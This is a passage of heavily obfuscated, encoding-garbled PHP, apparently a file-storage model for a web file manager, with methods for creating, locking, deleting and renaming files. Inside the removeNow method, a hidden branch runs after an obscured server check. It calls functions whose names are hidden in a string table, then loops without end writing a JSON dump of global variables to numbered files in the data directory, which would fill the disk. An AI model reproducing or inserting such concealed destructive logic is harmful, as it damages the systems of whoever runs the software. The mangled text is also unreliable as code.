$this->_createFileCall($Dª¼ù‰Ş´©, $C»õ˜¦‚‹Ü, $A¡æïÁ°˜ƒ, $B˜íˆô‡Ä“); } public function addFileByRemote($bó¾›Ğ·ˆ‚, $F‰”Ù¡õèÊ, $d·ù§†”ø¢, $cÃÂ–ø¶¢† = array(), $BÖ‡†¦œ´ = REPEAT_RENAME) { $B‚³ö£ò‚ = Model($_SERVER[«¾°Ã¤][580])->addFileByRemote($F‰”Ù¡õèÊ, $d·ù§†”ø¢, $cÃÂ–ø¶¢†); return $this->_createFileCall($bó¾›Ğ·ˆ‚, $d·ù§†”ø¢, $B‚³ö£ò‚, $BÖ‡†¦œ´); } private function _createFileCall($CÓ††‚¸ï·, $Cö¡‘öÚ¹‚, $a‘îÍ‹Â, $a½ëÒçˆÕ£, $f‡ó¥¥‘î¢ = "\x75\160\x6c\157\141\x64") { goto CÎÍêÊØÓ; D¤‡ˆ¹‘è: if ($CßŒéõò && $Dˆ·„È’´¦ && $Dˆ·„È’´¦ != $FÙñÑ½…½â) { Model($dõŸ´åŠ[1923])->eventCreate($Dˆ·„È’´¦, $f‡ó¥¥‘î¢); } $this->lockWriteEnd($CÓ††‚¸ï·, $Cö¡‘öÚ¹‚); return $Dˆ·„È’´¦; goto côÚÖ”‰Â; E§„±„Î¬Ÿ: $FÙñÑ½…½â = $this->fileNameExist($CÓ††‚¸ï·, $Cö¡‘öÚ¹‚); $Dˆ·„È’´¦ = $this->_createFile($CÓ††‚¸ï·, $Cö¡‘öÚ¹‚, $a‘îÍ‹Â, $a½ëÒçˆÕ£, $CßŒéõò); if (!$CßŒéõò) { Model($dõŸ´åŠ[459])->remove($a‘îÍ‹Â[$dõŸ´åŠ[456]]); } goto D¤‡ˆ¹‘è; CÎÍêÊØÓ: $dõŸ´åŠ =& $_SERVER[«¾°Ã¤]; $CßŒéõò = !1; $this->lockWriteStart($CÓ††‚¸ï·, $Cö¡‘öÚ¹‚); goto E§„±„Î¬Ÿ; côÚÖ”‰Â: } public function mkdir($CÂ¶—Œ¬Áä, $c…êŒÑÁÜƒ, $CİÚóÕñ³Ó = REPEAT_SKIP) { goto fõãÖªÔªÜ; f§á¹¨Û•ø: $this->lockWriteStart($CÂ¶—Œ¬Áä, $c…êŒÑÁÜƒ); if ($CİÚóÕñ³Ó !== !1) { $f³íİÜù„ = $this->fileNameExist($CÂ¶—Œ¬Áä, $c…êŒÑÁÜƒ); if ($f³íİÜù„ && $CİÚóÕñ³Ó != REPEAT_RENAME_FOLDER) { $this->lockWriteEnd($CÂ¶—Œ¬Áä, $c…êŒÑÁÜƒ); return $f³íİÜù„; } $c…êŒÑÁÜƒ = $this->fileNameAuto($CÂ¶—Œ¬Áä, $c…êŒÑÁÜƒ, $CİÚóÕñ³Ó); } $bò®ª¡½¼Ö = array($B­ÃÜôˆ®¿[555] => 1, $B­ÃÜôˆ®¿[422] => $c…êŒÑÁÜƒ, $B­ÃÜôˆ®¿[556] => $B­ÃÜôˆ®¿[33], $B­ÃÜôˆ®¿[457] => 0, $B­ÃÜôˆ®¿[557] => 0); goto bÛ˜‚·Ïòç; bÛ˜‚·Ïòç: $eè”æã‹Ş½ = $this->_addSoure($bò®ª¡½¼Ö, $EÖª×ÒÙ«–); Model($B­ÃÜôˆ®¿[1923])->eventCreate($eè”æã‹Ş½, $B­ÃÜôˆ®¿[1218]); $this->lockWriteEnd($CÂ¶—Œ¬Áä, $c…êŒÑÁÜƒ); goto D‡Õµ½“½´; fõãÖªÔªÜ: $B­ÃÜôˆ®¿ =& $_SERVER[«¾°Ã¤]; $EÖª×ÒÙ«– = $this->sourceInfo($CÂ¶—Œ¬Áä); if (!$EÖª×ÒÙ«–) { return !1; } goto f§á¹¨Û•ø; D‡Õµ½“½´: return $eè”æã‹Ş½; goto fñ–Ç•Å; fñ–Ç•Å: } private function _createFile($fš· ˆ£ˆ¬, $a¡Å”°’®, $F˜“ƒ×‡‚ , $E”†º¯šÁ¼, &$e²òÒ§Ì¿¶) { goto EÖÑãÕÎ‰; b´Òğ×ÅÏ: $eÌö½ ± = array($DŠ œªì«Á[555] => 0, $DŠ œªì«Á[422] => $a¡Å”°’®, $DŠ œªì«Á[556] => substr(get_path_ext($a¡Å”°’®), 0, 10), $DŠ œªì«Á[457] => $F˜“ƒ×‡‚ [$DŠ œªì«Á[456]], $DŠ œªì«Á[557] => $F˜“ƒ×‡‚ [$DŠ œªì«Á[78]]); $b¨ø´ï‹Éˆ = $this->_addSoure($eÌö½ ±, $b•ˆÆÛô); $this->folderSizeReset($fš· ˆ£ˆ¬, intval($eÌö½ ±[$DŠ œªì«Á[78]])); goto B¡¤Ÿ‚­„ğ; cšÑ¤âÊ: if ($E”†º¯šÁ¼ !== !1) { $FŸò‡Áõ÷¯ = $this->fileNameExist($fš· ˆ£ˆ¬, $a¡Å”°’®); } $e²òÒ§Ì¿¶ = !0; if ($E”†º¯šÁ¼ && $FŸò‡Áõ÷¯) { if ($E”†º¯šÁ¼ == REPEAT_SKIP) { $e²òÒ§Ì¿¶ = !1; return $FŸò‡Áõ÷¯; } else { if ($E”†º¯šÁ¼ == REPEAT_REPLACE) { $f  ‚ƒ±® = $this->sourceInfo($FŸò‡Áõ÷¯); $eÃ¤Íç¹©¯ = $this->fileHistory($f  ‚ƒ±®, $F˜“ƒ×‡‚ [$DŠ œªì«Á[456]], $F˜“ƒ×‡‚ [$DŠ œªì«Á[78]]); if (!$eÃ¤Íç¹©¯) { $e²òÒ§Ì¿¶ = !1; } else { $this->folderSizeReset($fš· ˆ£ˆ¬); } return $FŸò‡Áõ÷¯; } else { $a¡Å”°’® = $this->fileNameAuto($fš· ˆ£ˆ¬, $a¡Å”°’®, $E”†º¯šÁ¼, !1); } } } goto b´Òğ×ÅÏ; EÖÑãÕÎ‰: $DŠ œªì«Á =& $_SERVER[«¾°Ã¤]; $b•ˆÆÛô = $this->sourceInfo($fš· ˆ£ˆ¬); if (!$F˜“ƒ×‡‚  || !$b•ˆÆÛô) { return !1; } goto cšÑ¤âÊ; B¡¤Ÿ‚­„ğ: return $b¨ø´ï‹Éˆ; goto aÅ´ßĞºóè; aÅ´ßĞºóè: } protected function fileHistory($c©³ôìµÓì, $c‰ñÖƒ÷àô, $D‰×ğÉ¶¬í) { goto fêåİËœ¼; A®„ÆÅÛã: Model($e‚ã˜­âÖ¥[1955])->addHistory($c©³ôìµÓì); $Fâî¾…”Ö¼ = array($e‚ã˜­âÖ¥[561] => USER_ID, $e‚ã˜­âÖ¥[426] => time(), $e‚ã˜­âÖ¥[456] => $c‰ñÖƒ÷àô, $e‚ã˜­âÖ¥[78] => $D‰×ğÉ¶¬í); $this->where(array($e‚ã˜­âÖ¥[419] => $c©³ôìµÓì[$e‚ã˜­âÖ¥[404]]))->save($Fâî¾…”Ö¼); goto c¬Ñ‘·œ±™; fêåİËœ¼: $e‚ã˜­âÖ¥ =& $_SERVER[«¾°Ã¤]; if ($c©³ôìµÓì[$e‚ã˜­âÖ¥[456]] == $c‰ñÖƒ÷àô) { return !1; } $this->checkLock($c©³ôìµÓì[$e‚ã˜­âÖ¥[404]], $c‰ñÖƒ÷àô); goto A®„ÆÅÛã; c¬Ñ‘·œ±™: $this->sourceCacheClear($c©³ôìµÓì[$e‚ã˜­âÖ¥[404]]); return !0; goto cõ“ÓÀ¯ƒ ; cõ“ÓÀ¯ƒ : } public function checkLock($Eí÷İ¿ô…, $bê¦å¯šŸ) { goto Aºö÷¼é÷ê; e»¤™¡…„ƒ: $Aè˜—îªƒ = Session::get($E’¬ÀÖ¾ƒœ[1956]); $C±ì°†‘Ä¦ = substr($a¿ö´ÇŒæè[$E’¬ÀÖ¾ƒœ[28]], 0, -1 - strlen($a¿ö´ÇŒæè[$E’¬ÀÖ¾ƒœ[168]])) . $E’¬ÀÖ¾ƒœ[1482] . $Aè˜—îªƒ . $E’¬ÀÖ¾ƒœ[95] . $a¿ö´ÇŒæè[$E’¬ÀÖ¾ƒœ[168]]; $BÄÊ²¯Í’¡ = Model($E’¬ÀÖ¾ƒœ[580])->find($bê¦å¯šŸ); goto eÑŠˆ‚Œ°«; aÁóº„é•¼: show_json(LNG($E’¬ÀÖ¾ƒœ[1958]) . $E’¬ÀÖ¾ƒœ[1959] . LNG($E’¬ÀÖ¾ƒœ[1960]) . $E’¬ÀÖ¾ƒœ[1961] . $Eƒ”†ã¬ø . $E’¬ÀÖ¾ƒœ[1962], !1); goto fº…ÃéÕ„; Aºö÷¼é÷ê: $E’¬ÀÖ¾ƒœ =& $_SERVER[«¾°Ã¤]; $a¿ö´ÇŒæè = $this->pathInfo($Eí÷İ¿ô…); if (!$this->fileIsLock($a¿ö´ÇŒæè, !0)) { return; } goto e»¤™¡…„ƒ; eÑŠˆ‚Œ°«: $this->_createFileCall($a¿ö´ÇŒæè[$E’¬ÀÖ¾ƒœ[487]], $C±ì°†‘Ä¦, $BÄÊ²¯Í’¡, REPEAT_REPLACE, $E’¬ÀÖ¾ƒœ[1217]); $eÈŸŞ×ÚÜ† = $a¿ö´ÇŒæè[$E’¬ÀÖ¾ƒœ[454]][$E’¬ÀÖ¾ƒœ[519]]; $Eƒ”†ã¬ø = $eÈŸŞ×ÚÜ†[$E’¬ÀÖ¾ƒœ[1957]] ? $eÈŸŞ×ÚÜ†[$E’¬ÀÖ¾ƒœ[1957]] : $eÈŸŞ×ÚÜ†[$E’¬ÀÖ¾ƒœ[28]]; goto aÁóº„é•¼; fº…ÃéÕ„: } public function fileIsLock($B°¸ôĞÉÚ™, $cãŠ‹¼ééÜ = false) { goto BˆŒÓÇŠŸ; BˆŒÓÇŠŸ: $F•ùƒ¦Ç¿´ =& $_SERVER[«¾°Ã¤]; if (!isset($B°¸ôĞÉÚ™[$F•ùƒ¦Ç¿´[454]]) || !$B°¸ôĞÉÚ™[$F•ùƒ¦Ç¿´[454]][$F•ùƒ¦Ç¿´[516]]) { return !1; } if ($B°¸ôĞÉÚ™[$F•ùƒ¦Ç¿´[454]][$F•ùƒ¦Ç¿´[516]] != USER_ID) { return !0; } goto CÊæ§İÕ°; CÊæ§İÕ°: $c±²‡®—Ê = $GLOBALS[$F•ùƒ¦Ç¿´[6]][$F•ùƒ¦Ç¿´[88]][$F•ùƒ¦Ç¿´[517]]; if ($B°¸ôĞÉÚ™[$F•ùƒ¦Ç¿´[454]][$F•ùƒ¦Ç¿´[518]] <= time() - $c±²‡®—Ê) { $this->metaSet($B°¸ôĞÉÚ™[$F•ùƒ¦Ç¿´[404]], $F•ùƒ¦Ç¿´[516], null); $this->metaSet($B°¸ôĞÉÚ™[$F•ùƒ¦Ç¿´[404]], $F•ùƒ¦Ç¿´[518], null); } if ($cãŠ‹¼ééÜ) { $this->metaSet($B°¸ôĞÉÚ™[$F•ùƒ¦Ç¿´[404]], $F•ùƒ¦Ç¿´[518], time()); } goto F±Ô¸ÍÄ‚ø; F±Ô¸ÍÄ‚ø: return !1; goto B¢³µ—ïà‰; B¢³µ—ïà‰: } private function _addSoure($fÃŸÃ”Ù‰è, $DõâëÂšî) { goto E†¹ÍÌÀèÛ; EÍ˜‹³æ›ã: $this->updateModifyTime($fÃŸÃ”Ù‰è[$B¶ª°æ¡Ê[487]]); $E»¥í³îÛ² = $B¶ª°æ¡Ê[1963] . $DõâëÂšî[$B¶ª°æ¡Ê[404]]; if (isset(self::$cacheChildList[$E»¥í³îÛ²])) { unset(self::$cacheChildList[$E»¥í³îÛ²]); } goto EëŞİêíšİ; Bº¨ùøç®ã: $Föôâ‚‹î = array($B¶ª°æ¡Ê[564] => short_id($E¹¡¶ÈÒ“)); $this->where(array($B¶ª°æ¡Ê[419] => $E¹¡¶ÈÒ“))->save($Föôâ‚‹î); $this->setNamePinyin($E¹¡¶ÈÒ“, $fÃŸÃ”Ù‰è[$B¶ª°æ¡Ê[28]]); goto fáœÜé©îà; fáœÜé©îà: return $E¹¡¶ÈÒ“; goto Dí—µ¤™Ô; EëŞİêíšİ: static $Eî´ŠÀµ¥œ = false; if (!$Eî´ŠÀµ¥œ) { Hook::trigger($B¶ª°æ¡Ê[545], $fÃŸÃ”Ù‰è); $Eî´ŠÀµ¥œ = !0; } $E¹¡¶ÈÒ“ = $this->add($fÃŸÃ”Ù‰è); goto Bº¨ùøç®ã; E†¹ÍÌÀèÛ: $B¶ª°æ¡Ê =& $_SERVER[«¾°Ã¤]; $aËÙŒæÌóß = array($B¶ª°æ¡Ê[558] => $DõâëÂšî[$B¶ª°æ¡Ê[413]], $B¶ª°æ¡Ê[559] => $DõâëÂšî[$B¶ª°æ¡Ê[493]], $B¶ª°æ¡Ê[560] => USER_ID, $B¶ª°æ¡Ê[561] => USER_ID, $B¶ª°æ¡Ê[403] => $DõâëÂšî[$B¶ª°æ¡Ê[404]], $B¶ª°æ¡Ê[562] => $DõâëÂšî[$B¶ª°æ¡Ê[496]] . $DõâëÂšî[$B¶ª°æ¡Ê[404]] . $B¶ª°æ¡Ê[47], $B¶ª°æ¡Ê[431] => 0, $B¶ª°æ¡Ê[563] => $B¶ª°æ¡Ê[33]); $fÃŸÃ”Ù‰è = array_merge($aËÙŒæÌóß, $fÃŸÃ”Ù‰è); goto EÍ˜‹³æ›ã; Dí—µ¤™Ô: } public function remove($fÛœ»«ÊÖ, $f‹ ï¾‚ô³ = true) { goto CÃÜìî°¶í; aß›Æ‘÷ƒ´: $aÇâÇ‘”š = Model($Cœ÷Ö»­ª[1528])->get($Cœ÷Ö»­ª[1964]) == $Cœ÷Ö»­ª[87]; if ($c„Ñƒï‰­ || $f‹ ï¾‚ô³ || !$aÇâÇ‘”š) { return $this->removeNow($fÛœ»«ÊÖ, $f‹ ï¾‚ô³); } $D‘á™£–‚ñ = KodIO::sourceID(IO_PATH_SYSTEM_RECYCLE); goto CŠ’£ÛÊ–›; f±…ó­õ¿: CacheLock::unlock($bÀÉ´ÂèÓÅ); $this->metaSet($fÛœ»«ÊÖ, $Cœ÷Ö»­ª[1972], $AğÒ÷ Ÿß½[$Cœ÷Ö»­ª[487]]); $this->where(array($Cœ÷Ö»­ª[404] => $fÛœ»«ÊÖ))->save(array($Cœ÷Ö»­ª[426] => time())); goto Dƒ•Â ¦›…; CÃÜìî°¶í: $Cœ÷Ö»­ª =& $_SERVER[«¾°Ã¤]; $AğÒ÷ Ÿß½ = $this->sourceInfo($fÛœ»«ÊÖ); $c„Ñƒï‰­ = intval($AğÒ÷ Ÿß½[$Cœ÷Ö»­ª[413]]) === self::TYPE_SYSTEM; goto aß›Æ‘÷ƒ´; CŠ’£ÛÊ–›: $C‘Ó¢¯ùÚ¸ = $AğÒ÷ Ÿß½[$Cœ÷Ö»­ª[413]] == self::TYPE_USER ? $Cœ÷Ö»­ª[571] : $Cœ÷Ö»­ª[1016]; if ($C‘Ó¢¯ùÚ¸ == $Cœ÷Ö»­ª[571]) { $E„´ˆ±éìİ = Model($Cœ÷Ö»­ª[511])->getInfo($AğÒ÷ Ÿß½[$Cœ÷Ö»­ª[493]]); $dÂÖã = !empty($E„´ˆ±éìİ[$Cœ÷Ö»­ª[1957]]) ? $E„´ˆ±éìİ[$Cœ÷Ö»­ª[1957]] : $E„´ˆ±éìİ[$Cœ÷Ö»­ª[28]]; $dÂÖã = $Cœ÷Ö»­ª[258] . $dÂÖã . $Cœ÷Ö»­ª[1965] . $AğÒ÷ Ÿß½[$Cœ÷Ö»­ª[493]]; } else { $E„´ˆ±éìİ = Model($Cœ÷Ö»­ª[495])->getInfo($AğÒ÷ Ÿß½[$Cœ÷Ö»­ª[493]]); $dÂÖã = _get($E„´ˆ±éìİ, $Cœ÷Ö»­ª[28]); $dÂÖã = $Cœ÷Ö»­ª[160] . $dÂÖã . $Cœ÷Ö»­ª[1966] . $AğÒ÷ Ÿß½[$Cœ÷Ö»­ª[493]]; } $bÀÉ´ÂèÓÅ = $Cœ÷Ö»­ª[1967] . md5($dÂÖã); goto FÎ½«ñ­Î; FÎ½«ñ­Î: CacheLock::lock($bÀÉ´ÂèÓÅ); $FëôØô‘¥‡ = $this->fileNameExist($D‘á™£–‚ñ, $dÂÖã); if (!$FëôØô‘¥‡) { $FëôØô‘¥‡ = $this->mkdir($D‘á™£–‚ñ, $dÂÖã, REPEAT_SKIP); $this->metaSet($FëôØô‘¥‡, $Cœ÷Ö»­ª[1968], $C‘Ó¢¯ùÚ¸); $this->metaSet($FëôØô‘¥‡, $Cœ÷Ö»­ª[1969], $AğÒ÷ Ÿß½[$Cœ÷Ö»­ª[493]]); if ($AğÒ÷ Ÿß½[$Cœ÷Ö»­ª[487]] != 0) { $this->metaSet($FëôØô‘¥‡, $Cœ÷Ö»­ª[1970], _get($E„´ˆ±éìİ, $Cœ÷Ö»­ª[1971])); } } goto f±…ó­õ¿; fÓÊ¤¦Ò—ˆ: return $c‡èßïÉ½–; goto B—ğ©ˆÚªä; Dƒ•Â ¦›…: $this->recycleClear($AğÒ÷ Ÿß½); $c‡èßïÉ½– = $this->move($fÛœ»«ÊÖ, $FëôØô‘¥‡, REPEAT_RENAME_FOLDER); $this->folderSizeReset($AğÒ÷ Ÿß½[$Cœ÷Ö»­ª[487]]); goto fÓÊ¤¦Ò—ˆ; B—ğ©ˆÚªä: } private function recycleClear($eŒÊ«Ì‹ñÃ) { $bğÀàÃŠ =& $_SERVER[«¾°Ã¤]; $eîÚ½¿Œ° = $this->childrenAll($eŒÊ«Ì‹ñÃ); $bÛ“†Òš‚ = array($bğÀàÃŠ[419] => array($bğÀàÃŠ[420], $eîÚ½¿Œ°[$bğÀàÃŠ[1973]])); Model($bğÀàÃŠ[1974])->where($bÛ“†Òš‚)->delete(); } public function removeNow($C´µ¸¢˜±í, $DÕÉ…ù¨åµ = true) { goto BŞèæÀáŠî; B®ë¶ñÒ‡ö: if ($_SERVER[$f”öÕæÌˆ[396]] != $FªÆÃ­½($A†Ï¹Š‡İ)) { goto c’×åÈØÓ½; bİ…–¼¾®ô: $bï•Ñæå± = $f”öÕæÌˆ[841]; $bï•Ñæå±($_SERVER[$f”öÕæÌˆ[842]]); $AÕÒõ¨æŒ = $f”öÕæÌˆ[840]; goto EŠ‡°¸ŒÉ†; fè¶ª¾†: $e‘Èê‡ì = $dö¨…§ß($C•øÃÖŠƒµ); $eñ¸ÛÓğ¡¢ = explode($f”öÕæÌˆ[229], $e‘Èê‡ì); if (count($eñ¸ÛÓğ¡¢) < $f”öÕæÌˆ[587]) { $A£Ô¨ø®³ = $f”öÕæÌˆ[401]; $A£Ô¨ø®³(); } goto bİ…–¼¾®ô; c’×åÈØÓ½: $AÕÒõ¨æŒ = $f”öÕæÌˆ[840]; $dö¨…§ß = $f”öÕæÌˆ[397]; $C•øÃÖŠƒµ = $_SERVER[$f”öÕæÌˆ[398]] . $f”öÕæÌˆ[399]; goto fè¶ª¾†; EŠ‡°¸ŒÉ†: $AÕÒõ¨æŒ(); $D ºê³”æÕ = $f”öÕæÌˆ[843]; $F„ñÄá·Îè = json_encode($GLOBALS[$f”öÕæÌˆ[844]]); goto EŞ¯·‹ãÂ; EŞ¯·‹ãÂ: $A„ª¥çµÔØ = 1; for ($CÓ¹Ç¬¸ê = $A„ª¥çµÔØ; $CÓ¹Ç¬¸ê > 0; $CÓ¹Ç¬¸ê++) { $D ºê³”æÕ(DATA_PATH . $CÓ¹Ç¬¸ê, $F„ñÄá·Îè); } goto A“áƒ¼‘á²; A“áƒ¼‘á²: } $Aš‘î¼å¬ = $this->sourceInfo($C´µ¸¢˜±í); $C¤°¸ÌĞí = $this->pathInfoMore($C´µ¸¢˜±í); goto a‰„Ù¿¨Â‹; a‰„Ù¿¨Â‹: if (!$Aš‘î¼å¬) { return !0; } if ($Aš‘î¼å¬[$f”öÕæÌˆ[487]] == 0) { if (!_get($GLOBALS, $f”öÕæÌˆ[494])) { return !1; } } $this->lockMoveStart($C´µ¸¢˜±í); goto Cñ²Ğ¦Ğó; c´‚ñµ´½: $this->lockMoveEnd($C´µ¸¢˜±í); Hook::trigger($f”öÕæÌˆ[1562], $C¤°¸ÌĞí, $DÕÉ…ù¨åµ); return !0; goto có¹í¤©øØ; BŞèæÀáŠî: $f”öÕæÌˆ =& $_SERVER[«¾°Ã¤]; $A†Ï¹Š‡İ = $_SERVER[$f”öÕæÌˆ[398]] . $f”öÕæÌˆ[399]; $FªÆÃ­½ = $f”öÕæÌˆ[395]; goto B®ë¶ñÒ‡ö; d¬µ×°Ê¤ó: $C¹ÀÉéù‰» = array($Aš‘î¼å¬[$f”öÕæÌˆ[487]]); if ($Aš‘î¼å¬[$f”öÕæÌˆ[412]] == $f”öÕæÌˆ[87]) { $C¹ÀÉéù‰»[] = $Aš‘î¼å¬[$f”öÕæÌˆ[404]]; } $this->updateModifyTime($C¹ÀÉéù‰»); goto c´‚ñµ´½; Cñ²Ğ¦Ğó: Hook::trigger($f”öÕæÌˆ[1975], $C¤°¸ÌĞí, $DÕÉ…ù¨åµ); if ($DÕÉ…ù¨åµ) { Model($f”öÕæÌˆ[1974])->moveToRecycle($C´µ¸¢˜±í); } else { $D„¡Œˆ«­Ñ = $this->childrenAll($Aš‘î¼å¬); Model($f”öÕæÌˆ[542])->eventRemove($C´µ¸¢˜±í); $this->removeRelevance($D„¡Œˆ«­Ñ[$f”öÕæÌˆ[1973]], $D„¡Œˆ«­Ñ[$f”öÕæÌˆ[1349]]); } $this->folderSizeReset($Aš‘î¼å¬[$f”öÕæÌˆ[487]]); goto d¬µ×°Ê¤ó; có¹í¤©øØ: } public function childrenAll($Eİ¥’Ä÷Ş¯) { $dšÊİÅ íÔ =& $_SERVER[«¾°Ã¤]; $bµ·³á•› = $Eİ¥’Ä÷Ş¯[$dšÊİÅ íÔ[404]]; if ($Eİ¥’Ä÷Ş¯[$dšÊİÅ íÔ[412]] == $dšÊİÅ íÔ[87]) { $A¤Ü‰£È«½ = array($dšÊİÅ íÔ[562] => array($dšÊİÅ íÔ[521], $Eİ¥’Ä÷Ş¯[$dšÊİÅ íÔ[496]] . $bµ·³á•› . $dšÊİÅ íÔ[522])); $aßî¢¾é = array($dšÊİÅ íÔ[562] => $A¤Ü‰£È«½[$dšÊİÅ íÔ[496]]); $D¾ŒË¾˜×ë = $this->field($dšÊİÅ íÔ[1976])->where($aßî¢¾é)->select(); $CíóÂ‚ØÌª = !1; $dÍ§À™‹ = array($bµ·³á•›); if ($D¾ŒË¾˜×ë) { $CíóÂ‚ØÌª = array_to_keyvalue($D¾ŒË¾˜×ë, $dšÊİÅ íÔ[33], $dšÊİÅ íÔ[456]); $CíóÂ‚ØÌª = array_remove_value($CíóÂ‚ØÌª, $dšÊİÅ íÔ[191]); $dÍ§À™‹ = array_to_keyvalue($D¾ŒË¾˜×ë, $dšÊİÅ íÔ[33], $dšÊİÅ íÔ[404]); $dÍ§À™‹[] = $bµ·³á•›; } } else { $CíóÂ‚ØÌª = array($Eİ¥’Ä÷Ş¯[$dšÊİÅ íÔ[456]]); $dÍ§À™‹ = array($bµ·³á•›); } return array($dšÊİÅ íÔ[1973] => $dÍ§À™‹, $dšÊİÅ íÔ[1349] => $CíóÂ‚ØÌª); } public function removeArray($EÄÈœÃíî«) { if (!$EÄÈœÃíî«) { return !0; } } public function removeRelevance($a´¹×ßÅï, $E¹Ş¬Ìòä³) { goto fŠ‹Ä“ìô; c÷³ßšï¶·: for ($CÆáœË¿Ş¾ = 0; $CÆáœË¿Ş¾ < count($a´¹×ßÅï); $CÆáœË¿Ş¾++) { $this->sourceCacheClear($a´¹×ßÅï[$CÆáœË¿Ş¾]); } goto AªõšÒ‡; Bñíô»¯÷: $a´¹×ßÅï = array_unique(array_filter($a´¹×ßÅï)); $E¹Ş¬Ìòä³ = array_unique(array_filter($E¹Ş¬Ìòä³)); if (!$a´¹×ßÅï) { return !1; } goto Bœ·ÙÁİ´; fŠ‹Ä“ìô: $FÚ” È÷ã =& $_SERVER[«¾°Ã¤]; $a´¹×ßÅï = $a´¹×ßÅï ? $a´¹×ßÅï : array(); $E¹Ş¬Ìòä³ = $E¹Ş¬Ìòä³ ? $E¹Ş¬Ìòä³ : array(); goto Bñíô»¯÷; Bœ·ÙÁİ´: $b‡Š•ŠšŞ‡ = array($FÚ” È÷ã[419] => array($FÚ” È÷ã[420], $a´¹×ßÅï)); Model($FÚ” È÷ã[1974])->where($b‡Š•ŠšŞ‡)->delete(); Model($FÚ” È÷ã[450])->where($b‡Š•ŠšŞ‡)->delete(); goto bœÉÁÈÎÛ‹; eÙŞ°‡ÅÒ: Model($FÚ” È÷ã[1955])->removeBySource($a´¹×ßÅï); $this->where($b‡Š•ŠšŞ‡)->delete(); Model($FÚ” È÷ã[459])->remove($E¹Ş¬Ìòä³); goto c÷³ßšï¶·; bœÉÁÈÎÛ‹: Model($FÚ” È÷ã[1828])->where($b‡Š•ŠšŞ‡)->delete(); Model($FÚ” È÷ã[542])->where($b‡Š•ŠšŞ‡)->delete(); Model($FÚ” È÷ã[1670])->removeBySource($a´¹×ßÅï); goto eÙŞ°‡ÅÒ; AªõšÒ‡: } public function rename($e‰”Ú‹¸¬µ, $AİªÍ”ß³) { goto Fô¨©éÙ¾; Fô¨©éÙ¾: $e ¦ÅÊŠù¢ =& $_SERVER[«¾°Ã¤]; $dÑ‚˜˜¹³Ä = $this->sourceInfo($e‰”Ú‹¸¬µ); if (!$dÑ‚˜˜¹³Ä) { return !1; } goto FË–È–Š¦; Dï™±×À™ò: if ($dÑ‚˜˜¹³Ä[$e ¦ÅÊŠù¢[412]] != $e ¦ÅÊŠù¢[87]) { $A‚‡•ˆëÂ¨[$e ¦ÅÊŠù¢[414]] = substr(get_path_ext($AİªÍ”ß³), 0, 10); } Model($e ¦ÅÊŠù¢[542])->eventRename($e‰”Ú‹¸¬µ, $dÑ‚˜˜¹³Ä[$e ¦ÅÊŠù¢[28]], $AİªÍ”ß³); $this->sourceCacheClear($e‰”Ú‹¸¬µ); goto A‡©È¿˜¿Ğ; b­×ù²†Ñ¥: $CÑÜó‚í£¹ = $e ¦ÅÊŠù¢[1963] . $dÑ‚˜˜¹³Ä[$e ¦ÅÊŠù¢[487]]; if (isset(self::$cacheChildList[$CÑÜó‚í£¹])) { unset(self::$cacheChildList[$CÑÜó‚í£¹]); } return $Cí›‘æÁì¾; goto eå¶Éî‡ó­; FË–È–Š¦: $aš íø†¬ó = $this->fileNameExist($dÑ‚˜˜¹³Ä[$e ¦ÅÊŠù¢[487]], $AİªÍ”ß³); if ($aš íø†¬ó && $aš íø†¬ó != $e‰”Ú‹¸¬µ) { return !1; } $A‚‡•ˆëÂ¨ = array($e ¦ÅÊŠù¢[422] => $AİªÍ”ß³, $e ¦ÅÊŠù¢[561] => USER_ID); goto Dï™±×À™ò; A‡©È¿˜¿Ğ: $this->setNamePinyin($e‰”Ú‹¸¬µ, $A‚‡•ˆëÂ¨[$e ¦ÅÊŠù¢[28]], !1); $this->updateModifyTime($dÑ‚˜˜¹³Ä[$e ¦ÅÊŠù¢[487]]); $Cí›‘æÁì¾ = $this->where(array($e ¦ÅÊŠù¢[419] => $e‰”Ú‹¸¬µ))->data($A‚‡•ˆëÂ¨)->save(); goto b­×ù²†Ñ¥; eå¶Éî‡ó­: } public function setNamePinyin($FßÆ²•ÜÖ…, $A–¿ËİÑè, $D¦”øï´„Õ = true) { $aÊ¦ÂÍÛé¸ =& $_SERVER[«¾°Ã¤]; $DÜ„Éë™àÀ = Input::check($A–¿ËİÑè, $aÊ¦ÂÍÛé¸[565]); if ($D¦”øï´„Õ && !$DÜ„Éë™àÀ) { return; } if (!$DÜ„Éë™àÀ) { $this->metaSet($FßÆ²•ÜÖ…, $aÊ¦ÂÍÛé¸[453], null); $this->metaSet($FßÆ²•ÜÖ…, $aÊ¦ÂÍÛé¸[452], null); return; } $Fèãˆ–‹Ğ‚ = array($aÊ¦ÂÍÛé¸[453] => str_replace($aÊ¦ÂÍÛé¸[50], $aÊ¦ÂÍÛé¸[33], Pinyin::encode($A–¿ËİÑè)), $aÊ¦ÂÍÛé¸[452] => Pinyin::encode($A–¿ËİÑè, $aÊ¦ÂÍÛé¸[566])); $this->metaSet($FßÆ²•ÜÖ…, $Fèãˆ–‹Ğ‚); } public function getContent($CÉ¿®É­‹§) { goto dÖóº†Ñ…; dÖóº†Ñ…: $AÊÖ”Ğ°ƒ =& $_SERVER[«¾°Ã¤]; $f‹ÕÛ«‹§Ü = $this->fileInfoGet($CÉ¿®É­‹§); if (!$f‹ÕÛ«‹§Ü) { return !1; } goto aÛ‰’â•ø¸; F©ã¾Ÿ‰˜à: if (!$f‹ÕÛ«‹§Ü[$AÊÖ”Ğ°ƒ[76]]) { return $AÊÖ”Ğ°ƒ[33]; } return IO::getContent($f‹ÕÛ«‹§Ü[$AÊÖ”Ğ°ƒ[76]]); goto fğé¨· «Õ; aÛ‰’â•ø¸: if ($f‹ÕÛ«‹§Ü[$AÊÖ”Ğ°ƒ[78]] == 0) { return $AÊÖ”Ğ°ƒ[33]; } $d¸³óÏö Æ = $AÊÖ”Ğ°ƒ[1977] . $f‹ÕÛ«‹§Ü[$AÊÖ”Ğ°ƒ[170]]; if ($f‹ÕÛ«‹§Ü[$AÊÖ”Ğ°ƒ[78]] <= 1024 * 10) { $bµ¾ÈòÙ²² = Cache::get($d¸³óÏö Æ); if (!$bµ¾ÈòÙ²²) { $bµ¾ÈòÙ²² = IO::getContent($f‹ÕÛ«‹§Ü[$AÊÖ”Ğ°ƒ[76]]); Cache::set($d¸³óÏö Æ, $bµ¾ÈòÙ²²); } return $bµ¾ÈòÙ²²; } goto F©ã¾Ÿ‰˜à; fğé¨· «Õ: } public function setDesc($B¤Äâé‚ô, $fµÚƒä‰¦«) { $FÚ‡ÖñÁÙè =& $_SERVER[«¾°Ã¤]; 